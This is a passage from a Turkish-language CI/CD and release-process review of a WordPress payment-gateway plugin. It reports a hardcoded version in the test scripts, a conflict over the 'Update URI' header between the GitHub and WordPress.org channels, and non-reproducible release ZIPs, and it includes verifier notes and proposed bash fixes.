# 12 — Build, CI/CD, Release ve Repo Hijyeni

> PR #3 sistematik review · düşmanca doğrulamalı · 19 bulgu

## Özet

Bu PR'ın CI/CD katmanı tipik bir WordPress eklentisinin çok üzerinde: üçüncü taraf action'ların tamamı tam commit SHA'sına sabitlenmiş, her workflow'da varsayılan `permissions: contents: read` var, `pull_request_target` veya `github.event.*` -> `run:` enterpolasyonu hiç yok, docker imajları digest ile pinlenmiş, WordPress.org publish yolu gerçekten manuel + dry-run varsayılanlı ve çok kapılı. Buna karşılık release tekrarlanabilirliği yok: aynı commit'ten iki build farklı SHA-256 üretiyor (yerelde kanıtlandı) ve README kullanıcıya checksum doğrulatıyor. Daha ciddisi, `Update URI` başlığı etrafında kapalı bir döngü var: `check-version.js` GitHub kanalında başlığı zorunlu tutarken WordPress.org publish işi başlığın kaldırılmış olmasını şart koşuyor; yani dokümante edilmiş WP.org yayın yolu tüm CI'ı kırmadan izlenemiyor. Entegrasyon script'lerine gömülü `2.0.0` sürümü bir sonraki sürüm artışında CI'ı deterministik olarak kıracak. Son olarak `.codacy.yml` PHPCS'i bütün `*.php` için kapatıyor ve repoda PHPCS/WPCS/PHPStan hiç yok; bir ödeme eklentisi için PHP statik analizi fiilen `php -l` seviyesinde.

## Değerlendirme

| Ölçüt | Değer |
|---|---|
| Genel not | **B** |
| 🔴 Kritik | 0 |
| 🟠 Yüksek | 2 |
| 🟡 Orta | 8 |
| 🔵 Düşük | 8 |
| ⚪ Bilgi | 1 |
| Düşmanca doğrulamada elenen | 0 |
| Doğrulama sonrası severity düzeltilen | 0 |
| Bağımsız doğrulama kararı alan bulgu | 10 / 19 |
| Tarama geçişi | 1 |
| Referans verilen dosya | 11 |

## Güçlü yönler

- Üçüncü taraf action'ların TAMAMI tam commit SHA'sına pinlenmiş ve yanına okunabilir sürüm yorumu düşülmüş: actions/checkout@11bd719 (v4.2.2), shivammathur/setup-php@cf4cade (v2.33.0), actions/cache@5a3ec84 (v4.2.3), actions/upload-artifact@ea165f8 (v4.6.2), actions/download-artifact@d3f86a1 (v4.3.0), softprops/action-gh-release@da05d55 (v2.2.2), 10up/action-wordpress-plugin-deploy@54bd289 (2.3.0). Hareketli tag kullanan tek bir uses: yok.
- Her üç workflow'da da üst seviyede permissions: contents: read var; write yetkisi yalnızca release.yml:20-21'deki release job'ına verilmiş. WP.org publish job'ı bile salt-okunur token ile çalışıyor.
- pull_request_target hiç kullanılmamış ve hiçbir run: bloğunda ${{ github.event.* }} enterpolasyonu yok; deploy workflow'unda bütün dispatch input'ları env: üzerinden shell'e aktarılıyor (deploy-wordpress-org.yml:42-44, 72-74, 231-237).
- deploy-wordpress-org.yml gerçekten manuel (workflow_dispatch), mode default 'dry-run' (satır 17), publish job'ı if: inputs.mode == 'publish' ile kapılı (210), tam eşleşen PUBLISH:<slug>:<version> onay metni (241-245), environment variable WPORG_PLUGIN_SLUG ile slug bağlama (247-250), immutable tag checkout (61), sha256 chain-of-custody (182, 277-280) ve svn --no-auth-cache (288). Yanlışlıkla publish etme yolu koda göre kapalı.
- Secret'lar yalnızca env: üzerinden veriliyor, hiçbir yerde set -x yok, secret'lar echo edilmiyor; deploy job'ları timeout-minutes taşıyor (38, 213) ve concurrency cancel-in-progress: false ile yarı yolda kesilme engellenmiş.
- Entegrasyon testleri docker imajlarını mutable tag yerine sha256 digest ile pinliyor (tests/integration/run-schema-migration.sh:11-13, run-woocommerce-smoke.sh:11-13); check-translations.sh de wp-cli imajını digest ile pinliyor.
- npm ci --ignore-scripts kullanılıyor (tests.yml:99) — npm lifecycle script tabanlı tedarik zinciri saldırısını kapatıyor; ayrıca composer audit --locked (96) ve composer validate --strict (40, 90) her matris ayağında çalışıyor.
- composer.lock artık .gitignore'dan çıkarılıp repoya alınmış (.gitignore diff: '# Composer / composer.lock' silinmiş) — bu bir regresyon değil, doğru yönde bir düzeltme; hash-kilitli, tekrarlanabilir dev bağımlılığı sağlıyor.
- package-lock.json'daki bağımlılıklar güncel ve bilinen CVE'li sürüm içermiyor (cross-spawn@7.0.6, brace-expansion@1.1.18, tough-cookie@5.1.2, ws@8.21.3, eslint@9.39.5, jsdom@26.1.0); composer.lock'ta phpunit/phpunit@9.6.36 ve tüm sebastian/* güncel.
- Repo hijyeni temiz: git ls-files toplam 116 dosya; takipte hiçbir *.zip, .DS_Store, .phpunit.result.cache, node_modules/ veya vendor/ yok.
- smoke-check-artifact.sh sadece dosya varlığına bakmıyor: zip bütünlüğü (unzip -t), 26 zorunlu yol, 3 yasaklı desen grubu, tek üst-dizin kısıtı ve paketten çıkarılan HER PHP dosyasına php -l + her JS dosyasına node --check uyguluyor (satır 12-85). Bu, çoğu WP eklentisinde bulunmayan bir sağlamlık seviyesi.
- check-translations.sh POT'u sıfırdan yeniden üretip committed POT ile diff'liyor, .mo dosyalarını msgfmt ile derleyip cmp ile karşılaştırıyor, fuzzy/obsolete/untranslated girdileri reddediyor (43-79) — çeviri katmanı gerçekten kapılı.
- tests.yml'de tek bir continue-on-error veya if: always() yok; sessizce geçilen adım bulunmuyor. package job'ı needs: [test, lint, database-integration, woocommerce-integration] ile tüm kapıların arkasında.
- concurrency group + cancel-in-progress: true ile eski PR koşuları iptal ediliyor (tests.yml:13-15).
- .gitattributes'ta '* text=auto' + PHP/JS/CSS/JSON/MD/XML/YML/PO/POT için 'eol=lf' ve .mo/.png/.jpg/.gif/.zip için 'binary' doğru şekilde tanımlanmış; .mo dosyalarının satır sonu normalizasyonuyla bozulması engellenmiş.

## Bulgular

### CI-001 — Entegrasyon test script'lerine gömülü '2.0.0' sürümü, bir sonraki sürüm artışında CI'ı deterministik olarak kırar

| | |
|---|---|
| **Severity** | 🟠 Yüksek |
| **Kategori** | ci-correctness |
| **Konum** | [tests/integration/run-schema-migration.sh:80](../../../tests/integration/run-schema-migration.sh#L80) |
| **Güven** | high |
| **Doğrulama** | ✅ Doğrulandı (1/1) |

**Sorun ve kanıt**

```bash
run-schema-migration.sh:80 `bash "$repository_root/.github/scripts/build-release.sh" 2.0.0 "$artifact_path"` ve run-woocommerce-smoke.sh:84 aynı satır. build-release.sh:23 ise `node "$repository_root/.github/scripts/check-version.js" "$version"` çağırıyor; check-version.js:62 `expectedVersion = expectedArgument || headerVersion` ve 91-95 satırları plugin header / NICEPAY_VERSION / CHANGELOG / bootstrap / POT değerlerinin bu argümana eşit olmasını şart koşuyor. Yani argüman olarak sabit '2.0.0' geçildiği için header 2.0.1 olduğu anda mismatch üretir.
```

**Başarısızlık senaryosu**

Bakımcı 2.0.1 yamasını hazırlar: nicepay-payment-gateway.php Version/NICEPAY_VERSION, CHANGELOG, POT ve tests/bootstrap/bootstrap.php 2.0.1'e çekilir (check-version.js bunların hepsini zaten zorunlu tutar). Push -> `lint` ve `test` job'ları yeşil, ama `database-integration` job'ı build-release.sh 2.0.0 çağrısında `ERROR: Plugin header: expected 2.0.0, found 2.0.1` ile exit 1 verir. Aynı hata `woocommerce-integration`'da tekrarlanır ve `package` job'ı hiç çalışmaz.

**Etki**

Sürüm 2.0.1'e çıkarıldığı ilk commit'te tests.yml'deki `database-integration` ve `woocommerce-integration` job'ları, kodda hiçbir sorun olmamasına rağmen 'Plugin header: expected 2.0.0, found 2.0.1' hatasıyla kırmızıya döner. Bu iki job `package` job'ının needs listesinde olduğu için tüm PR ve tag pipeline'ı bloke olur; bakımcı, gerçek bir hata sanıp zaman kaybeder veya (daha kötüsü) job'ı devre dışı bırakır.

**Öneri**

Sürümü script içinde header'dan türet, sabitleme. Her iki script'e ekle:
```bash
plugin_version="$(sed -nE 's/^[[:space:]]*\*[[:space:]]*Version:[[:space:]]*([^[:space:]]+).*/\1/p' \
    "$repository_root/nicepay-payment-gateway.php" | head -n 1)"
[[ -n "$plugin_version" ]] || { echo 'ERROR: plugin version could not be resolved' >&2; exit 1; }
bash "$repository_root/.github/scripts/build-release.sh" "$plugin_version" "$artifact_path"
```
Alternatif olarak build-release.sh'ın 1. argümanını opsiyonel yapıp yokken header'dan okumasını sağla (`version="${1:-$(...)}"`).

---

### CI-002 — 'Update URI' başlığı GitHub ve WordPress.org kanalları arasında çözümsüz bir kilit yaratıyor; dokümante edilen WP.org yayın yolu CI'ı kırmadan izlenemez

| | |
|---|---|
| **Severity** | 🟠 Yüksek |
| **Kategori** | release-process |
| **Konum** | [.github/scripts/check-version.js:75](../../../.github/scripts/check-version.js#L75) |
| **Güven** | high |
| **Doğrulama** | ⚠️ 2 kısmen |

**Sorun ve kanıt**

```javascript
check-version.js:66 `const distributionChannel = process.env.NICEPAY_DISTRIBUTION_CHANNEL || 'github';` ve 75-76: `else if (distributionChannel === 'github' && (!updateUriMatch || updateUriMatch[1] !== expectedUpdateUri)) { failures.push(...) }` — yani kanal belirtilmediğinde `Update URI` başlığı ZORUNLU. deploy-wordpress-org.yml:257-260 ise publish job'ında: `if grep -Eq '^\s*\*\s*Update URI:' nicepay-payment-gateway.php; then echo 'ERROR: remove the third-party Update URI before publishing...'; exit 1`. release.yml:39 (`node .github/scripts/check-version.js "$version"`), tests.yml:111 (`composer quality` -> check-version) ve tests.yml:157 (build-release.sh -> check-version.js:23) hiçbiri NICEPAY_DISTRIBUTION_CHANNEL set etmiyor, dolayısıyla hepsi 'github' kanalında çalışıyor.
```

**Başarısızlık senaryosu**

Bakımcı WP.org onayını alır, `Update URI` satırını nicepay-payment-gateway.php:5'ten siler, `v2.1.0` tag'i atar. (a) `Release` workflow'u tetiklenir ve `verify` (tests.yml) job'ı `ERROR: Plugin header Update URI: expected https://github.com/cemililik/...` ile başarısız olur; GitHub Release ve checksum hiç üretilmez. (b) deploy-wordpress-org.yml `prepare` job'ı NICEPAY_DISTRIBUTION_CHANNEL=wordpress-org-candidate ile geçse bile, artık indirilebilir bir GitHub artefaktı yoktur. Tersine, `Update URI` kalırsa deploy publish job'ı 257. satırda durur.

**Etki**

docs/WORDPRESS-ORG-RELEASE.md:56-58'de zorunlu tutulan 'WordPress.org sürümünde Update URI kaldırılmalıdır' adımı uygulandığı anda: `lint` job'ı (composer quality), `package` job'ı (build-release.sh), `database-integration`, `woocommerce-integration` ve tag push'unda `release.yml` — hepsi birden kırmızıya döner. Aynı immutable tag hem GitHub Release hem WP.org publish için kullanılamaz. Pratikte WP.org yayını ya hiç yapılamaz ya da CI kapıları elle atlanarak (branch protection bypass) yapılır — ki bu tüm release güvenlik modelini iptal eder.

**Öneri**

Kanal seçimini sürüm dosyasından değil, tek bir kaynak-of-truth'tan türet. En basit çözüm: check-version.js'de 'github' kanalında Update URI'yi zorunlu değil, yalnızca 'varsa doğru olmalı' yap ve GitHub kanalına özel zorunluluğu sadece release.yml'ye taşı:
```js
if (updateUriMatch && updateUriMatch[1] !== expectedUpdateUri) {
    failures.push(`Plugin header Update URI: unexpected value ${updateUriMatch[1]}`);
}
```
ve release.yml'de ek bir adımla `NICEPAY_REQUIRE_UPDATE_URI=1` ile zorunluluğu uygula. Alternatif: WP.org için ayrı bir `wporg/vX.Y.Z` tag namespace'i tanımla ve tests.yml/release.yml'yi bu tag üzerinde NICEPAY_DISTRIBUTION_CHANNEL=wordpress-org-candidate ile çalıştır. Hangi yol seçilirse seçilsin, docs/WORDPRESS-ORG-RELEASE.md §4 bu iki kanalın nasıl bir arada yaşadığını açıklamalı.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `partially-confirmed`)

- Severity düzeltmesi: `high` → `medium`
- Düzeltilmiş iddia: `Update URI` başlığı iki dağıtım kanalı arasında çözümsüz bir kilit yaratıyor: check-version.js:66 varsayılan kanalı `github` yaptığı ve 75-76 bu kanalda başlığı ZORUNLU tuttuğu için; deploy-wordpress-org.yml:257-260 ise publish'te başlığın YOKLUĞUNU zorunlu tuttuğu için, dokümante edilen WP.org yayın adımı (docs/WORDPRESS-ORG-RELEASE.md:56, 178) uygulandığı anda repo CI'ı komple kırmızıya döner: tests.yml lint (111 -> composer quality), database-integration (122 -> run-schema-migration.sh:80), woocommerce-integration (133 -> run-woocommerce-smoke.sh:84), bunlara `needs` ile bağlı package (138, 157) ve tag push'unda release.yml:39. deploy prepare, tag'in development atası olmasını şart koştuğu için (deploy yml:85-89) bu commit'in development geçmişine girmesi de zorunludur; kaçış yolu yoktur.

DÜZELTME 1: Orijinal iddianın "GitHub Release üretilmediği için indirilebilir artefakt kalmaz" gerekçesi yanlıştır. deploy-wordpress-org prepare job'ı GitHub Release asset'i tüketmez; tag checkout'undan (58-62) kendi ZIP'ini üretir (152) ve kendi workflow artifact'ını yükler (184-192); publish onu indirir (224-228). Gerçek sonuç daha da tuhaftır: WP.org deploy yolu YEŞİL çalışırken, aynı commit'in normal repo CI'ı ve GitHub Release'i kırık kalır — yani iki kanal aynı tag üzerinde tutarlı bir "yeşil" duruma asla ulaşamaz.

DÜZELTME 2: "branch protection bypass ile release güvenlik modeli iptal olur" ifadesi repodan doğrulanamaz (branch protection/required checks konfigürasyonu repoda yok). Kanıtlanabilir etki, dokümante edilen WP.org sürümünün yeşil bir pipeline ile üretilememesi ve sürekli kırmızı bir development dalıyla yaşamak zorunda kalınmasıdır.

Öneri geçerlidir: `github` kanalında başlığı "varsa doğru olmalı" yapıp zorunluluğu tek bir yere (örn. release.yml'de `NICEPAY_REQUIRE_UPDATE_URI=1`) taşımak, ya da WP.org için ayrı bir tag namespace'i tanımlayıp tests.yml/release.yml'yi o tag'de `wordpress-org-candidate` kanalıyla çalıştırmak. Her iki durumda da docs §4 iki kanalın nasıl bir arada yaşadığını açıklamalıdır. Ek olarak, düzeltme yapılırken tests/integration/*.sh:80/84'teki sabit `2.0.0` sürümünün de check-version.js'e girdiği unutulmamalıdır.
- Gerekçe: Çekirdek iddia KODLA DOĞRULANDI: `Update URI` başlığı, varsayılan `github` kanalında check-version.js tarafından ZORUNLU tutuluyor; WordPress.org publish job'ı ise aynı başlığın YOKLUĞUNU zorunlu tutuyor. İki kapı da aynı dosyanın (nicepay-payment-gateway.php) aynı satırına, aynı immutable tag üzerinde bakıyor. Bu gerçek, çözümsüz bir kilit.

Doğruladığım zincir:
1. check-version.js:66 varsayılanı `github`; 75-76 bu kanalda başlık yoksa VEYA beklenen değerde değilse `failures.push` -> 113-117 `process.exit(1)`.
2. Bu script'i başlatan ve NICEPAY_DISTRIBUTION_CHANNEL SET ETMEYEN tüm yolları grep'ledim (`grep -rn "check-version"`). Yalnızca 4 çağrı yeri var: composer.json:29/33 (`quality`), build-release.sh:23, release.yml:39, deploy-wordpress-org.yml:91. Sadece sonuncusu kanalı `wordpress-org-candidate` olarak set ediyor (deploy yml:72 ve 142). Diğer hepsi varsayılan `github` kanalında çalışıyor. İddiayı çürütecek bir üst-katman guard, erken return veya env varsayılanı BULAMADIM.
3. İddianın şüpheyle karşıladığım kısmını — `database-integration` ve `woocommerce-integration` job'larının da kırılacağı — ayrıca test ettim ve İDDİA HAKLI ÇIKTI: her iki script de build-release.sh çağırıyor (run-schema-migration.sh:80, run-woocommerce-smoke.sh:84), o da satır 23'te check-version.js'i env'siz çalıştırıyor. Yani `Update URI` silindiği anda tests.yml'deki 4 job (lint, database-integration, woocommerce-integration ve bunlara `needs` ile bağlı package) + release.yml'nin `Extract and validate tag version` adımı kırmızıya döner.
4. Kilidin kaçış yolu da kapalı: deploy prepare job'ı satır 85-89'da tag commit'inin `origin/development` atası olmasını şart koşuyor. Yani `Update URI`'siz commit development geçmişine girmek ZORUNDA — ve development'a push/PR tests.yml'i tetikliyor (tests.yml:5-8).
5. docs/WORDPRESS-ORG-RELEASE.md:56 ve 178 gerçekten başlığın kaldırılmasını zorunlu kılıyor; §4 iki kanalın nasıl bir arada yaşayacağını açıklamıyor — iddianın doküman boşluğu tespiti de doğru.

DÜZELTTİĞİM İKİ NOKTA (bu yüzden `confirmed` değil `partially-confirmed`):
(a) Başarısızlık senaryosu (b) şıkkı YANLIŞ: "deploy prepare geçse bile artık indirilebilir bir GitHub artefaktı yoktur" iddiası kodu yansıtmıyor. deploy-wordpress-org.yml prepare job'ı GitHub Release asset'i İNDİRMİYOR; tag checkout'undan (satır 58-62) kendi paketini build-release.sh ile üretiyor (satır 152) ve kendi workflow artifact'ını yüklüyor (satır 184-192); publish job'ı da bu artifact'ı indiriyor (satır 224-228). Yani GitHub Release'in hiç oluşmaması WP.org deploy'unu teknik olarak engellemez — ironik biçimde deploy yolu YEŞİL kalırken repo CI'ı komple kırmızı olur. Bu detay hatası bulgunun geçerliliğini düşürmüyor ama "etki" tarifini bozuyor.
(b) "branch protection bypass ile tüm release güvenlik modelini iptal eder" ifadesi repodan DOĞRULANAMAZ: branch protection / required status checks ayarları repo dosyalarında yok, dolayısıyla gerekli status check zorunluluğu spekülatif. Gerçek ve kanıtlanabilir etki "dokümante edilen sürüm yeşil bir pipeline ile üretilemez"dir.

SEVERITY: `high` -> `medium`. Gerekçe: mekanizma gerçek ama yalnızca HENÜZ AKTİF OLMAYAN bir kanalı etkiliyor (docs:3 ve docs:12 eklentinin WordPress.org'da yayımlanmadığını açıkça söylüyor), çalışan hiçbir yolu bugün bozmuyor, çalışma zamanı/güvenlik etkisi yok ve düzeltmesi tek `if` bloğu. Sürüm mühendisliği açısından gerçek bir kusur olduğu için `low` da değil.

**Doğrulayıcı notu** (lens: `sonuc-ve-istismar`, karar: `partially-confirmed`)

- Severity düzeltmesi: `high` → `medium`
- Düzeltilmiş iddia: `Update URI` başlığı, GitHub ve WordPress.org kanalları arasında tek bir immutable `vX.Y.Z` tag'inin ikisini birden tatmin etmesini imkânsız kılar. `check-version.js:66` kanalı varsayılan olarak `github` yapar ve `:75-76` başlığı zorunlu kılar; bu env yalnızca `deploy-wordpress-org.yml:72,:142`'de set edilir, `tests.yml`/`release.yml`'de hiç set edilmez. `deploy-wordpress-org.yml:257-260` ise publish için başlığın YOK olmasını şart koşar; `:86` tag'in `development` içinde olmasını, `:48`/`:61` tag'in `vX.Y.Z` olmasını zorunlu tutar — dolayısıyla `release.yml:4-6` tetiklenmesinden ve `development` CI'ından kaçış yolu yoktur.

Somut sonuç (iddianın orijinal etkisinden DAR): `docs/WORDPRESS-ORG-RELEASE.md:56,178`'deki zorunlu adım uygulandığı anda `lint` (tests.yml:110-111 -> composer quality -> check-version.js:75), `database-integration` (tests.yml:122 -> run-schema-migration.sh:80 -> build-release.sh:23) ve `woocommerce-integration` (tests.yml:133 -> run-woocommerce-smoke.sh:84 -> build-release.sh:23) kırmızıya döner, `package` job'ı skip olur ve `release.yml`'in `release` job'ı (`needs: verify`) hiç çalışmaz — o sürüm için GitHub Release, ZIP ve `.sha256` üretilmez.

ANCAK: WordPress.org yayını yine de YAPILABİLİR. `deploy-wordpress-org.yml` adayı `prepare` içinde kendisi üretip (`:152`) artifact olarak yükler (`:184-192`) ve `publish` bunu indirir (`:224-228`); GitHub Release'e hiçbir bağımlılığı yoktur. Publish'in kendi güvenlik kapıları (`:210`, `:214-216`, `:241-245`, `:247-250`, `:252-255`, `:272-280`, `:287-289`) da tamamen korunur. Yani "WP.org yayını hiç yapılamaz" ve "tüm release güvenlik modeli iptal olur" ifadeleri yanlıştır; gerçek bedel, WP.org'a çıkan sürüm için GitHub dağıtım kanalının (Release + checksum) sessizce kaybolması ve `development` branch CI'ının kalıcı kırmızı kalmasıdır.

Ayrıca öneri eksik: "ayrı `wporg/vX.Y.Z` tag namespace'i" alternatifi uygulanacaksa `deploy-wordpress-org.yml:48` (numerik `x.y.z` regex) ve `:61` (`ref: refs/tags/v${{ inputs.version }}`) de değiştirilmelidir.
- Gerekçe: ÇEKİRDEK İDDİA DOĞRU VE ÜRETİLEBİLİR. Aynı immutable `vX.Y.Z` tag'i iki kanalın gereksinimlerini aynı anda karşılayamaz:

(A) `check-version.js:66` kanalı `process.env.NICEPAY_DISTRIBUTION_CHANNEL || 'github'` ile varsayılan olarak `github` yapar; `:75-76` github kanalında `Update URI` başlığını ZORUNLU kılar. Repo genelinde bu env yalnız `deploy-wordpress-org.yml:72` ve `:142`'de set edilir (grep ile doğrulandı) — `tests.yml` ve `release.yml`'de hiç geçmez.
(B) `deploy-wordpress-org.yml:219-222` publish job'ı tag'i checkout eder ve `:257-260` çalışma dizinindeki `nicepay-payment-gateway.php`'de `Update URI` görürse `exit 1` yapar.
(C) `deploy-wordpress-org.yml:86` tag commit'inin `origin/development` içinde olmasını zorunlu kılar; `tests.yml:5-8` ise `development`'a push ve PR'da tetiklenir. Yani "Update URI'siz" commit kaçınılmaz olarak `development` CI'ından geçmek zorundadır.
(D) `deploy-wordpress-org.yml:48` tag'i `x.y.z` numerik yapar → tag mutlaka `v*` olur → `release.yml:4-6` tetiklenir. Ayrı bir tag namespace'i ile kaçış yolu YOK.

Somut istismar/üretim adımları (doğrulandı):
1. `docs/WORDPRESS-ORG-RELEASE.md:178` checklist maddesi ("Eklenti PHP header'ındaki üçüncü taraf `Update URI` kaldırıldı") uygulanır → `nicepay-payment-gateway.php:5` silinir.
2. `development`'a PR/push → `tests.yml:110-111` (`composer quality` → composer.json:30-33 → `@check-version`) `ERROR: Plugin header Update URI: expected https://github.com/cemililik/nicepay-paymentgateway-wordpress-plugin` ile exit 1.
3. İddianın `database-integration` ve `woocommerce-integration` de kırılır demesi de DOĞRU (ben başta şüphelendim, kontrol ettim): `tests.yml:122` → `run-schema-migration.sh:80` ve `tests.yml:133` → `run-woocommerce-smoke.sh:84` her ikisi de `build-release.sh` çağırır, o da `build-release.sh:23`'te env set etmeden `check-version.js` çalıştırır. `package` job'ı `needs: lint` (tests.yml:138) olduğu için skip olur.
4. `v2.1.0` push → `release.yml:12-14` `verify` job'ı aynı üç kırmızı job'la düşer → `release` job'ı (`needs: verify`) hiç çalışmaz → GitHub Release, ZIP ve `.sha256` üretilmez.
5. Ters yön: `Update URI` kalırsa `deploy-wordpress-org.yml:257-260` publish'i durdurur. Kilit gerçek.

ANCAK İDDİANIN İKİ ETKİ SATIRI KODLA ÇELİŞİYOR:

(1) Başarısızlık senaryosu (b): "artık indirilebilir bir GitHub artefaktı yoktur" — YANLIŞ. `deploy-wordpress-org.yml` GitHub Release'e hiç bağımlı değil. `prepare` job'ı adayı kendisi üretir (`:152` `build-release.sh`, `:167-169` zip, `:184-192` `upload-artifact`) ve `publish` job'ı bunu `download-artifact` ile alır (`:224-228`). `release.yml` kırmızı olsa bile WP.org publish sonuna kadar çalışır.

(2) "Pratikte WP.org yayını ya hiç yapılamaz ya da CI kapıları elle atlanarak (branch protection bypass) yapılır — ki bu tüm release güvenlik modelini iptal eder" — ABARTILI. WP.org publish yolunun kendi kapıları (`:210` mode gate, `:214-216` korumalı environment, `:241-245` confirmation, `:247-250` `WPORG_PLUGIN_SLUG`, `:252-255` secrets, `:272-280` sha256 doğrulama, `:287-289` svn info) tamamen sağlam kalır ve hiçbiri `tests.yml`/`release.yml` sonucuna bağlı değil. Gerçek bedel: WP.org'a yayımlanan sürüm için `development` branch'i kalıcı kırmızı ve o sürümün GitHub Release + checksum'ı hiç üretilmemiş olur — yani GitHub dağıtım kanalı sessizce kaybolur, "release güvenlik modeli iptal" olmaz.

SEVERITY DÜZELTMESİ: high → medium. Gerekçe: (i) runtime/güvenlik etkisi sıfır, tamamen release süreci; (ii) önkoşul WP.org slug onayı — `docs/WORDPRESS-ORG-RELEASE.md:3,12` eklentinin henüz yayımlanmadığını açıkça yazıyor, yani sorun ilk WP.org sürümünde ilk kez patlar; (iii) WP.org publish yolu aslında çalışır, sadece GitHub kanalı ve branch CI'ı düşer; (iv) düzeltme tek satırlık. Yine de gerçek: dokümante edilmiş ZORUNLU bir adım (`docs/WORDPRESS-ORG-RELEASE.md:56,178`) uygulandığı anda CI'ın üç job'ı kırmızıya döner ve doküman bu çelişkinin nasıl çözüleceğini hiçbir yerde açıklamaz — `:56` sadece "github kanalında zorunlu" der, tag'in aynı anda iki kanalı nasıl tatmin edeceğini yazmaz. Öneri (kanal zorunluluğunu `release.yml`'ye taşımak veya ayrı tag namespace'i) teknik olarak uygulanabilir; ancak ayrı tag namespace alternatifi `deploy-wordpress-org.yml:48` ve `:61`'deki `refs/tags/v${VERSION}` sabitini de değiştirmeyi gerektirir — öneri bunu belirtmiyor.

---

### CI-003 — Release ZIP'i tekrarlanabilir (reproducible) değil: aynı commit iki farklı SHA-256 üretiyor, ama README kullanıcıya checksum doğrulatıyor

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | supply-chain |
| **Konum** | [.github/scripts/build-release.sh:69](../../../.github/scripts/build-release.sh#L69) |
| **Güven** | high |
| **Doğrulama** | ✅ Doğrulandı (1/1) |

**Sorun ve kanıt**

```bash
build-release.sh:41-64 dosyaları `cp -R` / `cp` ile (yani `-p` olmadan, mtime = build anı) geçici dizine kopyalıyor; 67-70 `( cd "$temporary_root"; zip -q -r "$output_path" "$plugin_slug" )` — `-X` yok, `SOURCE_DATE_EPOCH`/sabit mtime yok, `sort` ile sabit girdi sırası yok, `umask` sabitlenmemiş. Yerelde doğrulandı: aynı çalışma ağacından art arda iki build `96722461c95efd205072646acd484b948a65b8a281c9056957717e3cd5f890ee` ve (4 saniye sonra) `1d1e079580f44ebeb714d51e4cb1e7d337525b95f993164964f3938c797e05b2` üretti — içerik birebir aynı, checksum farklı. deploy-wordpress-org.yml:169'daki yeniden paketleme (`zip -q -r "$payload_zip" "$PLUGIN_SLUG"`) da aynı sorunu taşıyor.
```

**Başarısızlık senaryosu**

Kurumsal bir müşterinin güvenlik ekibi, GitHub Releases'ten indirdiği `nicepay-payment-gateway-2.0.0.zip`'in gerçekten `v2.0.0` tag'inden geldiğini doğrulamak ister. `git checkout v2.0.0 && bash .github/scripts/build-release.sh 2.0.0 out.zip && sha256sum out.zip` çalıştırır. Sonuç, yayımlanan `.sha256` ile eşleşmez. Ekip ya paketin kurcalandığı sonucuna varır (yanlış pozitif olay kaydı) ya da checksum doğrulamasını tamamen anlamsız bulup terk eder.

**Etki**

release.yml:66'da yayımlanan `.sha256`, sadece 'bu dosya indirilirken bozulmadı' garantisi verir; 'bu ZIP gerçekten v2.0.0 tag'inden üretilmiştir' garantisini VERMEZ. Üçüncü bir taraf (güvenlik denetçisi, WP.org inceleme ekibi, kurumsal müşteri) ZIP'i kaynaktan yeniden üretip checksum'ı doğrulayamaz. Bir ödeme ağ geçidi için bu, tedarik zinciri güven zincirindeki en değerli halkanın eksik olması demektir. Ayrıca dosya sırası readdir'e bağlı olduğundan farklı dosya sistemlerinde (ext4 vs APFS vs overlayfs) girdi sırası da değişebilir.

**Öneri**

build-release.sh'ı deterministik hale getir:
```bash
source_epoch="${SOURCE_DATE_EPOCH:-$(git -C "$repository_root" log -1 --pretty=%ct)}"
umask 022
# kopyalamadan sonra:
find "$package_root" -exec touch -h -d "@$source_epoch" {} +
chmod -R a=rX,u+w "$package_root"
(
    cd "$temporary_root"
    find "$plugin_slug" -print | LC_ALL=C sort | \
        TZ=UTC zip -q -X -9 "$output_path" -@
)
```
Aynı bloğu deploy-wordpress-org.yml:167-170'teki yeniden paketlemede de kullan (tercihen build-release.sh'a `--slug` parametresi ekleyip tek kod yolundan geç). Sonra README.md:39-41'e 'aynı tag'ten yeniden üretim' talimatını ekle ve CI'a iki kez build edip checksum karşılaştıran bir adım koy.

**Doğrulayıcı notu** (lens: `kod-gercekligi`, karar: `confirmed`)

- Gerekçe: İddiadaki her konum açıldı ve satır numaraları dosyaların şu anki haliyle birebir eşleşiyor. Determinizmi sağlayacak hiçbir koruma (SOURCE_DATE_EPOCH, touch/sabit mtime, zip -X, sıralı girdi, sabit umask) ne script'te ne de onu çağıran iki workflow adımında var; başka bir katmanda telafi eden bir mekanizma da bulunamadı (`grep -rn "SOURCE_DATE_EPOCH\|reproducib" README.md docs/ .github/` — .github altında hiç eşleşme yok, docs/ eşleşmeleri sadece analiz notları).

Yerelde bağımsız olarak yeniden ürettim: aynı çalışma ağacından 3 saniye arayla iki build (b1.zip, b2.zip) sırasıyla `da6387e5...` ve `de72789e...` SHA-256 verdi; `cmp` ilk farkı **char 11**'de buluyor — bu ZIP local file header'ındaki "last mod file time" alanı, yani fark tam olarak mtime kaynaklı. Buna karşılık `unzip -Z1 | md5` her iki arşiv için de `c395185e99248d47bbbe862ec32c4869`, yani içerik ve girdi sırası birebir aynı. İddianın çekirdeği ("içerik aynı, checksum farklı") böylece doğrulandı. İddiada verilen `96722461c95...` hash'i de scratchpad'de duran önceki build ile eşleşiyor.

Etki değerlendirmesi de doğru: release.yml:63-66 checksum'ı ZIP üretildikten *sonra* aynı işte hesaplıyor, dolayısıyla yalnızca indirme bütünlüğü garantisi verir; kaynaktan yeniden üretimle doğrulama imkânsız. README.md:39 ve 41 kullanıcıya açıkça checksum indirtip doğrulatıyor, yani doküman-kod beklenti açığı gerçek. deploy-wordpress-org.yml:169'daki ikinci `zip -q -r` de aynı bayraksız çağrı.

İki küçük nüans (severity'yi değiştirmiyor, `partially-confirmed` gerektirecek düzeyde değil): (1) İddiadaki "readdir sırası nedeniyle dosya sırası da değişebilir" kısmı benim testimde gerçekleşmedi (sıra sabit çıktı) — bu, kanıtlanmış değil, teorik/`low confidence` bir risk; asıl kanıtlanan tek değişken mtime. (2) deploy-wordpress-org.yml:182 ve 279'daki `.sha256` üretip `sha256sum --check` ile doğrulama, job'lar arası artifact aktarım bütünlüğü için meşru ve doğru bir kullanım; oradaki checksum'ın tekrarlanabilirlik iddiası yok — yani sorun sadece kamuya yayımlanan release checksum'ının anlamını aşırı yorumlamakta.

---

### CI-004 — check-version.js readme.txt 'Stable tag' ve package.json 'version' alanlarını kapsamıyor; GitHub release'i bayat readme.txt ile çıkabilir

| | |
|---|---|
| **Severity** | 🟡 Orta |
| **Kategori** | release-metadata |
